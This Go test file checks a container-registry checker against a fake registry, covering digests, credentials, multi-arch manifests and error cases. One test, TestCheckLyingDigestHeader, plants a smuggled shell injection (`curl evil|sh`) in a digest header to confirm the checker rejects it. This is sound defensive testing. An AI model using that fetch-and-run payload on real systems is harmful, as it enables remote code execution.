package registrycheck

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"testing"

	"github.com/gpuai-dev/gpuai-oss/internal/imageref"
)

var wellFormedDigest = regexp.MustCompile(`^sha256:[a-f0-9]{64}$`)

// fakeRegistry serves a minimal distribution API: token challenge, a
// multi-arch index for repo "acme/multi", a single-manifest repo
// "acme/single", an arm64-only repo "acme/armonly", and a private repo.
func fakeRegistry(t *testing.T, requireToken bool) *httptest.Server {
	t.Helper()
	const tokenVal = "test-token"
	mux := http.NewServeMux()
	var srvURL string

	authed := func(r *http.Request) bool {
		return !requireToken || r.Header.Get("Authorization") == "Bearer "+tokenVal
	}
	mux.HandleFunc("GET /v2/", func(w http.ResponseWriter, r *http.Request) {
		if !authed(r) {
			w.Header().Set("WWW-Authenticate", `Bearer realm="`+srvURL+`/token",service="fake"`)
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		w.WriteHeader(http.StatusOK)
	})
	mux.HandleFunc("GET /token", func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(map[string]string{"token": tokenVal})
	})

	// The checker computes the digest from the manifest BYTES, so the fake
	// serves marshalled blobs and (for the honest paths) a matching header.
	writeJSON := func(w http.ResponseWriter, v any) {
		b, _ := json.Marshal(v)
		sum := sha256.Sum256(b)
		w.Header().Set("Docker-Content-Digest", "sha256:"+hex.EncodeToString(sum[:]))
		w.Write(b)
	}
	configBlob := map[string]any{
		"architecture": "amd64", "os": "linux",
		"config": map[string]any{"Entrypoint": []string{"/entry.sh"}, "Cmd": []string{"serve", "--port", "8000"}},
	}
	armConfig := map[string]any{"architecture": "arm64", "os": "linux", "config": map[string]any{}}

	mux.HandleFunc("GET /v2/acme/multi/manifests/{ref}", func(w http.ResponseWriter, r *http.Request) {
		if !authed(r) {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		if r.PathValue("ref") == "sha256:"+strings.Repeat("d", 64) {
			writeJSON(w, map[string]any{
				"mediaType": "application/vnd.docker.distribution.manifest.v2+json",
				"config":    map[string]string{"digest": "sha256:cfg"},
			})
			return
		}
		writeJSON(w, map[string]any{
			"mediaType": "application/vnd.oci.image.index.v1+json",
			"manifests": []map[string]any{
				{"digest": "sha256:" + strings.Repeat("e", 64), "platform": map[string]string{"architecture": "arm64", "os": "linux"}},
				{"digest": "sha256:" + strings.Repeat("d", 64), "platform": map[string]string{"architecture": "amd64", "os": "linux"}},
			},
		})
	})
	mux.HandleFunc("GET /v2/acme/multi/blobs/{d}", func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(configBlob)
	})

	mux.HandleFunc("GET /v2/acme/single/manifests/{ref}", func(w http.ResponseWriter, r *http.Request) {
		writeJSON(w, map[string]any{
			"mediaType": "application/vnd.docker.distribution.manifest.v2+json",
			"config":    map[string]string{"digest": "sha256:cfg2"},
		})
	})
	mux.HandleFunc("GET /v2/acme/single/blobs/{d}", func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(configBlob)
	})

	mux.HandleFunc("GET /v2/acme/armonly/manifests/{ref}", func(w http.ResponseWriter, r *http.Request) {
		writeJSON(w, map[string]any{
			"mediaType": "application/vnd.docker.distribution.manifest.v2+json",
			"config":    map[string]string{"digest": "sha256:cfg3"},
		})
	})
	mux.HandleFunc("GET /v2/acme/armonly/blobs/{d}", func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(armConfig)
	})

	mux.HandleFunc("GET /v2/acme/private/manifests/{ref}", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusUnauthorized)
	})
	mux.HandleFunc("GET /v2/acme/missing/manifests/{ref}", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
	})

	srv := httptest.NewServer(mux)
	srvURL = srv.URL
	t.Cleanup(srv.Close)
	return srv
}

func testChecker(srv *httptest.Server) *Checker {
	host := strings.TrimPrefix(srv.URL, "http://")
	return New(WithTestTransport(func(string) string { return host }))
}

func mustRef(t *testing.T, s string) imageref.Ref {
	t.Helper()
	ref, err := imageref.Parse(s)
	if err != nil {
		t.Fatal(err)
	}
	return ref
}

func TestCheckMultiArchWithToken(t *testing.T) {
	c := testChecker(fakeRegistry(t, true))
	res, err := c.Check(context.Background(), mustRef(t, "reg.example.com/acme/multi:v1"), nil)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !wellFormedDigest.MatchString(res.Digest) {
		t.Errorf("digest = %q, want computed sha256:<64 hex>", res.Digest)
	}
	if len(res.Entrypoint) != 1 || res.Entrypoint[0] != "/entry.sh" {
		t.Errorf("entrypoint = %v", res.Entrypoint)
	}
	if len(res.Cmd) != 3 || res.Cmd[0] != "serve" {
		t.Errorf("cmd = %v", res.Cmd)
	}
}

func TestCheckSingleManifestAnonymous(t *testing.T) {
	c := testChecker(fakeRegistry(t, false))
	res, err := c.Check(context.Background(), mustRef(t, "reg.example.com/acme/single:v1"), nil)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !wellFormedDigest.MatchString(res.Digest) {
		t.Errorf("digest = %q, want computed sha256:<64 hex>", res.Digest)
	}
}

// TestCheckLyingDigestHeader pins the fail-closed behavior for the review
// finding: a registry whose Docker-Content-Digest header disagrees with the
// sha256 of the manifest bytes it served is refused — the header is
// customer-controlled and must never be trusted into the launch ref.
func TestCheckLyingDigestHeader(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /v2/{$}", func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(http.StatusOK) })
	mux.HandleFunc("GET /v2/acme/liar/manifests/{ref}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Docker-Content-Digest", "sha256:"+strings.Repeat("f", 64)+`'; curl evil|sh;'`)
		b, _ := json.Marshal(map[string]any{
			"mediaType": "application/vnd.docker.distribution.manifest.v2+json",
			"config":    map[string]string{"digest": "sha256:cfg"},
		})
		w.Write(b)
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	c := testChecker(srv)
	_, err := c.Check(context.Background(), mustRef(t, "reg.example.com/acme/liar:v1"), nil)
	if !errors.Is(err, ErrUnreachable) {
		t.Fatalf("lying digest header: got %v, want ErrUnreachable", err)
	}
}

func TestCheckErrors(t *testing.T) {
	c := testChecker(fakeRegistry(t, false))
	cases := []struct {
		ref  string
		want error
	}{
		{"reg.example.com/acme/missing:v1", ErrNotFound},
		{"reg.example.com/acme/private:v1", ErrPrivate},
		{"reg.example.com/acme/armonly:v1", ErrPlatform},
	}
	for _, tc := range cases {
		_, err := c.Check(context.Background(), mustRef(t, tc.ref), nil)
		if !errors.Is(err, tc.want) {
			t.Errorf("Check(%s): got %v, want %v", tc.ref, err, tc.want)
		}
	}
}

// TestCheckDigestPinnedRef exercises the digest-pinned request path: the
// manifest content must hash to exactly the digest asked for — a match
// succeeds, any other content is ErrNotFound (fail closed, not fall back).
func TestCheckDigestPinnedRef(t *testing.T) {
	c := testChecker(fakeRegistry(t, false))
	// Learn the true content digest via a tag request first.
	res, err := c.Check(context.Background(), mustRef(t, "reg.example.com/acme/single:v1"), nil)
	if err != nil {
		t.Fatalf("tag check: %v", err)
	}

	pinned, err := c.Check(context.Background(), mustRef(t, "reg.example.com/acme/single@"+res.Digest), nil)
	if err != nil {
		t.Fatalf("matching digest-pinned check: %v", err)
	}
	if pinned.Digest != res.Digest {
		t.Errorf("pinned digest = %q, want %q", pinned.Digest, res.Digest)
	}

	wrong := "sha256:" + strings.Repeat("0", 64)
	if _, err := c.Check(context.Background(), mustRef(t, "reg.example.com/acme/single@"+wrong), nil); !errors.Is(err, ErrNotFound) {
		t.Fatalf("mismatched digest-pinned check: got %v, want ErrNotFound", err)
	}
}

// TestCheckWrongCredentials pins the Phase-2 error split: a refusal WITH
// credentials is ErrAuthFailed (fix your login), not ErrPrivate.
func TestCheckWrongCredentials(t *testing.T) {
	mux := http.NewServeMux()
	var srvURL string
	mux.HandleFunc("GET /v2/{$}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("WWW-Authenticate", `Bearer realm="`+srvURL+`/token",service="s"`)
		w.WriteHeader(http.StatusUnauthorized)
	})
	mux.HandleFunc("GET /token", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusUnauthorized) // every login is wrong
	})
	srv := httptest.NewServer(mux)
	srvURL = srv.URL
	t.Cleanup(srv.Close)
	c := testChecker(srv)

	creds := &Credentials{Username: "u", Password: "wrong"}
	if _, err := c.Check(context.Background(), mustRef(t, "reg.example.com/acme/x:v1"), creds); !errors.Is(err, ErrAuthFailed) {
		t.Fatalf("wrong creds: got %v, want ErrAuthFailed", err)
	}
	// Same refusal anonymously stays ErrPrivate.
	if _, err := c.Check(context.Background(), mustRef(t, "reg.example.com/acme/x:v1"), nil); !errors.Is(err, ErrPrivate) {
		t.Fatalf("anonymous: got %v, want ErrPrivate", err)
	}
}

func TestCheckUnreachable(t *testing.T) {
	srv := fakeRegistry(t, false)
	c := testChecker(srv)
	srv.Close()
	_, err := c.Check(context.Background(), mustRef(t, "reg.example.com/acme/single:v1"), nil)
	if !errors.Is(err, ErrUnreachable) {
		t.Errorf("got %v, want ErrUnreachable", err)
	}
}
